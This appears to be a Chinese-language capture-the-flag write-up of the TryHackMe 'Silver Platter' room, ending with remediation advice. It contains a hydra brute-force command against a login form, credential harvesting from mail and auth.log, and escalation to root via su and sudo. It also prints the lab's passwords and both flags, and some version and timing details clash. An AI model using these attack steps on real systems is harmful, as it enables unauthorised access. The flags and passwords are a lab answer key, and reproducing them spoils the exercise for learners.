# THM 10.49.162.172 渗透测试 Writeup

**日期**: 2026-06-03
**测试者**: yao
**目标**: 10.49.162.172
**平台**: TryHackMe 授权靶场 (Silver Platter)
**耗时**: ~120 分钟
**状态**: ✅ 全部完成 (2/2 Flags)

---

## 1. 信息搜集

### 1.1 端口扫描
采用定向端口扫描策略：

```bash
nmap -sS -p21,22,80,443,445,8080,8443,2222 -T4 --open 10.49.162.172
```

**结果**：
| 端口     | 状态 | 服务 | 版本                            |
| -------- | ---- | ---- | ------------------------------- |
| 22/tcp   | open | SSH  | OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 |
| 80/tcp   | open | HTTP | nginx 1.18.0 (Ubuntu)           |
| 8080/tcp | open | HTTP | Silverpeas 6.3.1                |

### 1.2 Web 枚举
```bash
gobuster dir -u http://10.49.162.172 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
```

**发现**：
- `/index.html` → Hack Smarter Security 主页
- 创始人: Tyler Ramsbey
- 项目经理: scr1ptkiddy (在 Silverpeas 上)

### 1.3 Silverpeas 发现
访问 http://silverpeas.thm:8080/silverpeas/：
- Silverpeas 6.3.1 协作平台
- 登录端点: `/silverpeas/AuthenticationServlet`
- 已知用户名: `scr1ptkiddy`

---

## 2. 初始访问

### 2.1 密码爆破 - cewl + hydra
使用 cewl 从网站提取关键词生成字典：

```bash
cewl http://10.49.162.172/ > passwords.txt
```

使用 hydra 爆破 Silverpeas：

```bash
hydra -l scr1ptkiddy -P passwords.txt silverpeas.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
```

**结果**：
```
[8080][http-post-form] host: silverpeas.thm   login: scr1ptkiddy   password: adipiscing
```

**密码分析**：`adipiscing` 来自网页中的 Lorem ipsum 占位文本！

### 2.2 Silverpeas 邮件枚举
登录后枚举 Silverpeas 内部消息：

```bash
# 读取邮件 ID=6（可疑内容）
curl -s -b /tmp/silver_cookies.txt "http://silverpeas.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6"
```

**发现 SSH 凭据**：

```
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

---

## 3. SSH 登录 tim

### 3.1 登录
```bash
ssh tim@10.49.162.172
# 密码: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

**系统信息**：
- OS: Ubuntu 16.04.7 LTS
- Kernel: Linux 4.4.0-190-generic x86_64
- 用户: tim (uid=1001)
- 组: tim, adm

### 3.2 User Flag
```bash
cat ~/user.txt
```

**Flag**: `THM{c4ca4238a0b923820dcc509a6f75849b}`

---

## 4. 权限提升

### 4.1 adm 组权限利用
tim 用户在 adm 组，可以读取系统日志：

```bash
# 读取 auth.log 寻找提权线索
cat /var/log/auth.log.2 | grep -i "tyler\|password\|DB_PASSWORD"
```

**发现**：

```
DB_PASSWORD=_Zd_zx7N823/
POSTGRES_PASSWORD=_Zd_zx7N823/
```

tyler 在 sudo 组，且数据库密码被复用为系统密码！

### 4.2 切换到 tyler
```bash
su tyler
# 密码: _Zd_zx7N823/
```

### 4.3 sudo 提权到 root
tyler 在 sudo 组，直接提权：

```bash
sudo su
```

**获取 root shell**

### 4.4 Root Flag
```bash
cat /root/root.txt
```

**Flag**: `THM{098f6bcd4621d373cade4e832627b4f6}`

---

## 5. 攻击路径总结

```
[信息搜集]
  └── Nmap 扫描 → 发现 22/80/8080
      └── Web 枚举 → 发现 Silverpeas 6.3.1
          └── cewl 生成字典 + hydra 爆破
              └── Silverpeas 登录 (scr1ptkiddy:adipiscing)
                  └── 邮件枚举 → 发现 tim SSH 凭据
                      └── SSH 登录 tim
                          └── user flag
                              └── adm 组读取 auth.log
                                  └── 发现 tyler 数据库密码 (_Zd_zx7N823/)
                                      └── su tyler → sudo su → root
                                          └── root flag
```

---

## 6. 漏洞分析

### 6.1 漏洞列表

| 漏洞          | 风险等级 | 说明                                   |
| ------------- | -------- | -------------------------------------- |
| 密码复用      | 高       | 数据库密码复用为系统用户密码           |
| 密码泄露      | 高       | 密码明文存储在邮件和日志中             |
| 日志权限过宽  | 中       | adm 组可读 auth.log，泄露敏感凭据      |
| 弱密码        | 中       | Silverpeas 密码为 Lorem ipsum 占位文本 |
| sudo 权限过宽 | 中       | tyler 可直接 sudo 到 root              |

### 6.2 修复建议

1. **禁止密码复用**
   - 数据库密码与系统密码分离
   - 使用不同复杂度要求的密码

2. **日志脱敏**
   - 命令行参数中避免直接传递密码
   - 使用配置文件或环境变量存储敏感信息

3. **最小权限原则**
   - adm 组不应能读取包含敏感凭据的日志
   - sudo 权限应精细化配置

4. **安全通信**
   - 邮件中不应传输明文密码
   - 使用加密通道传输凭据

---

## 7. 技术细节

### 7.1 工具使用
- **Nmap**: 端口扫描与服务识别
- **Gobuster**: Web 目录爆破
- **cewl**: 网站关键词提取生成字典
- **hydra**: HTTP 表单爆破
- **curl**: HTTP 请求与 API 枚举
- **grep**: 日志分析与信息提取

### 7.2 关键命令速查
```bash
# 端口扫描
nmap -sS -p22,80,8080 -T4 --open 10.49.162.172

# Web 目录爆破
gobuster dir -u http://10.49.162.172 -w common.txt -x php,txt,html,bak

# cewl 字典生成
cewl http://10.49.162.172/ > passwords.txt

# hydra 表单爆破
hydra -l scr1ptkiddy -P passwords.txt silverpeas.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"

# 日志分析
grep -r "tyler\|password\|DB_PASSWORD" /var/log/

# 权限提升
su tyler
sudo su
```

---

## 8. 时间线

| 时间  | 动作                | 结果                        |
| ----- | ------------------- | --------------------------- |
| T+0m  | Nmap 初始扫描       | 发现 22/80/8080             |
| T+10m | Web 枚举            | 发现 Silverpeas 6.3.1       |
| T+20m | cewl + hydra 爆破   | 获取 scr1ptkiddy:adipiscing |
| T+30m | Silverpeas 邮件枚举 | 获取 tim SSH 凭据           |
| T+40m | SSH 登录 tim        | 获取 user flag              |
| T+50m | adm 组日志分析      | 发现 tyler 数据库密码       |
| T+60m | su tyler → sudo su  | 获取 root shell             |
| T+70m | Root shell          | 获取 root flag              |

---

## 9. 参考

- [Silverpeas 官方文档](https://www.silverpeas.org/)
- [cewl 工具](https://digi.ninja/projects/cewl.php)
- [THM Silver Platter Room](https://tryhackme.com/)

---

**文档状态**: ✅ 完成
**最后更新**: 2026-06-03